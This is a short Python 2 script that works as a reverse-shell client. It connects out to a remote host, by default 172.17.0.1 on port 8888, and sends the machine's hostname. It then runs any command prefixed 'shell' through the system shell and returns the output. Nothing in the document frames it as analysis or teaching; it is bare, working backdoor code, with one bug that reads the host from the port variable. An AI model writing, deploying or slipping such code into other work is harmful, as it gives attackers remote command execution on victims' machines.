#!/usr/bin/env python

import socket, os, sys, subprocess


def connect():
    global host
    global port
    global s

    port = int(os.getenv('REMOTE_PORT', "8888"))
    host = os.getenv('REMOTE_PORT', "172.17.0.1")


    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print '[!] Trying to connect to %s:%s' % (host, port)
        s.connect((host,port))
        print '[*] Connection established'
        s.send(os.environ['HOSTNAME'])
    except:
        print 'Could not connect.'

def receive():
    while True:
        receive = s.recv(1024)
        print 'Command : %s' % receive

        if receive == 'quit':
            break
        elif receive[0:5] == 'shell':
            proc2 = subprocess.Popen(receive[6:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout_value = proc2.stdout.read() + proc2.stderr.read()
            args = stdout_value
        else:
            args = 'no valid input was given.'

        send = s.send(args)

def main():
    connect()
    receive()
    s.close()

main()
